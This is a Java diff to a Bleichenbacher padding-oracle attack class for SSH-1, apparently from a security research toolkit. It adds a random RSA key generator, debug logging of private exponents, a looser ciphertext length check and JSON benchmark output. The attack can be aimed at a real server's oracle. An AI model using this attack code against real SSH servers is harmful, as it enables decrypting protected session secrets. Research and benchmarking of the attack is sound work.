@@ -37,9 +37,7 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.math.BigInteger;
-import java.security.InvalidKeyException;
-import java.security.MessageDigest;
-import java.security.NoSuchAlgorithmException;
+import java.security.*;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -47,6 +45,7 @@ import java.util.Random;
 import javax.crypto.NoSuchPaddingException;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+import org.json.simple.JSONObject;
 
 /**
  * Sends differently formatted PKCS#1 v2.x messages to the SSH server and observes the server
@@ -70,7 +69,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     private KeyLenght keyLenght;
     private OracleType oracleType;
 
-    private CustomRsaPrivateKey serverPrivateKey, hostPrivatKey;
+    private CustomRsaPrivateKey serverPrivateKey, hostPrivateKey;
 
     // Host 2048
     CustomRsaPrivateKey hostPrivatKey2048 =
@@ -362,12 +361,37 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         return lastMessage.toString();
     }
 
+    private BigInteger[] RSAKeyPairGenerator(int bitlength) {
+        BigInteger p;
+        BigInteger q;
+        BigInteger N;
+        BigInteger phi;
+        BigInteger e;
+        BigInteger d;
+        SecureRandom r;
+
+        r = new SecureRandom();
+        p = new BigInteger(bitlength / 2, 100, r);
+        q = new BigInteger(bitlength / 2, 100, r);
+        N = p.multiply(q);
+        phi = p.subtract(BigInteger.ONE).multiply(q.subtract(BigInteger.ONE));
+        e = new BigInteger("65537");
+        while (phi.gcd(e).intValue() > 1) {
+            e = e.add(new BigInteger("2"));
+        }
+        d = e.modInverse(phi);
+
+        return new BigInteger[] {e, d, N};
+    }
+
     @Override
     public void executeAttack() {
         if (!config.getSendSinglePacket().isEmpty()) {
             byte[] msg = ArrayConverter.hexStringToByteArray(config.getSendSinglePacket());
             LOGGER.info(sendSinglePacket(msg));
         }
+
+        boolean randomKeys = false;
 
         this.oracleType = config.getOracleType();
         this.keyLenght = config.getKeyLenght();
@@ -396,23 +420,63 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             getHostPublicKey();
             getServerPublicKey();
         } else {
-            switch (keyLenght) {
-                case SHORT:
-                    serverPrivateKey = this.serverPrivateKey768;
-                    serverPublicKey = this.serverPublicKey768;
-                    hostPrivatKey = this.hostPrivatKey1024;
-                    hostPublicKey = this.hostPublicKey1024;
-                    break;
-                case LONG:
-                    serverPrivateKey = this.serverPrivateKey1024;
-                    serverPublicKey = this.serverPublicKey1024;
-                    hostPrivatKey = this.hostPrivatKey2048;
-                    hostPublicKey = this.hostPublicKey2048;
-                    break;
-                default:
-                    LOGGER.fatal(
-                            "Error - you need to choose a valid Keylenght if oracle-Type is not 'real'");
-                    throw new RuntimeException();
+            if (!randomKeys) {
+                switch (keyLenght) {
+                    case SHORT:
+                        serverPrivateKey = this.serverPrivateKey768;
+                        serverPublicKey = this.serverPublicKey768;
+                        hostPrivateKey = this.hostPrivatKey1024;
+                        hostPublicKey = this.hostPublicKey1024;
+                        break;
+                    case LONG:
+                        serverPrivateKey = this.serverPrivateKey1024;
+                        serverPublicKey = this.serverPublicKey1024;
+                        hostPrivateKey = this.hostPrivatKey2048;
+                        hostPublicKey = this.hostPublicKey2048;
+                        break;
+                    default:
+                        LOGGER.fatal(
+                                "Error - you need to choose a valid Keylenght if oracle-Type is not 'real'");
+                        throw new RuntimeException();
+                }
+            } else {
+                int serverKeyLenght, hostKeyLenght;
+                switch (keyLenght) {
+                    case SHORT:
+                        serverKeyLenght = 768;
+                        hostKeyLenght = 1024;
+                        break;
+                    case LONG:
+                        serverKeyLenght = 1024;
+                        hostKeyLenght = 2048;
+                        break;
+                    default:
+                        LOGGER.fatal(
+                                "Error - you need to choose a valid Keylenght if oracle-Type is not 'real'");
+                        throw new RuntimeException();
+                }
+                BigInteger[] serverKeyData = RSAKeyPairGenerator(serverKeyLenght);
+
+                serverPrivateKey = new CustomRsaPrivateKey(serverKeyData[1], serverKeyData[2]);
+                serverPublicKey = new CustomRsaPublicKey(serverKeyData[0], serverKeyData[2]);
+
+                BigInteger[] hostKeyData = RSAKeyPairGenerator(hostKeyLenght);
+
+                hostPrivateKey = new CustomRsaPrivateKey(hostKeyData[1], hostKeyData[2]);
+                hostPublicKey = new CustomRsaPublicKey(hostKeyData[0], hostKeyData[2]);
+
+                LOGGER.debug(
+                        ArrayConverter.bytesToHexString(
+                                hostPrivateKey.getPrivateExponent().toByteArray()));
+                LOGGER.debug(
+                        ArrayConverter.bytesToHexString(
+                                hostPublicKey.getPublicExponent().toByteArray()));
+                LOGGER.debug(
+                        ArrayConverter.bytesToHexString(
+                                serverPrivateKey.getPrivateExponent().toByteArray()));
+                LOGGER.debug(
+                        ArrayConverter.bytesToHexString(
+                                serverPublicKey.getPublicExponent().toByteArray()));
             }
         }
 
@@ -449,7 +513,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
         }
 
-        if ((encryptedSecret.length * Byte.SIZE) != hostPublicKey.getModulus().bitLength()) {
+        if ((encryptedSecret.length * Byte.SIZE) > hostPublicKey.getModulus().bitLength()) {
             throw new ConfigurationException(
                     "The length of the encrypted secret "
                             + "is not equal to the public key length. Have you selected the correct value?");
@@ -476,7 +540,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 oracle =
                         new Ssh1MockOracle(
                                 hostPublicKey,
-                                hostPrivatKey,
+                                hostPrivateKey,
                                 serverPublicKey,
                                 serverPrivateKey,
                                 oracleType);
@@ -520,31 +584,26 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
 
         if (config.isBenchmark()) {
             try {
-                String str =
-                        String.format(
-                                "{"
-                                        + "  \"Plaintext\": \"%s\","
-                                        + "  \"Ciphertext\": \"%s\","
-                                        + "  \"Time\": \"%d\",\n"
-                                        + "  \"Inner-Tries\": \"%d\","
-                                        + "  \"Outer-Tries\": \"%d\","
-                                        + "  \"serverkey_lenght\": \"%d\","
-                                        + "  \"hostkey_lenght\": \"%d\","
-                                        + "  \"oracle_type\": \"%s\","
-                                        + " \"attack_type\": \"%s\""
-                                        + "}",
-                                ArrayConverter.bytesToHexString(solutionByteArray),
-                                ArrayConverter.bytesToHexString(encryptedSecret),
-                                timeElapsed,
-                                attacker.getCounterInnerBleichenbacher(),
-                                attacker.getCounterOuterBleichenbacher(),
-                                serverPublicKey.getModulus().bitLength(),
-                                hostPublicKey.getModulus().bitLength(),
-                                oracleType.toString(),
-                                attackType);
+                JSONObject jo = new JSONObject();
+                jo.put("plaintext", ArrayConverter.bytesToRawHexString(solutionByteArray));
+                jo.put("ciphertext", ArrayConverter.bytesToRawHexString(encryptedSecret));
+                jo.put("time", timeElapsed);
+                jo.put("inner-Tries", attacker.getCounterInnerBleichenbacher());
+                jo.put("outer-Tries", attacker.getCounterOuterBleichenbacher());
+                jo.put("trimmed_outer", attacker.isOuterTrimmed());
+                jo.put("trimmed_inner", attacker.isInnerTrimmed());
+                jo.put("outer_trimmers", attacker.getOuterTrimmers());
+                jo.put("inner_trimmers", attacker.getInnerTrimmers());
+                jo.put("serverkey_lenght", serverPublicKey.getModulus().bitLength());
+                jo.put("hostkey_lenght", hostPublicKey.getModulus().bitLength());
+                jo.put("oracle_type", oracleType.toString());
+                jo.put("attack_type", attackType);
+
+                String jsonStr = jo.toJSONString();
+
                 File output_File = new File("benchmark_results.txt");
                 FileOutputStream outputStream = new FileOutputStream(output_File, true);
-                byte[] strToBytes = str.getBytes();
+                byte[] strToBytes = jsonStr.getBytes();
                 outputStream.write(strToBytes);
 
                 outputStream.close();
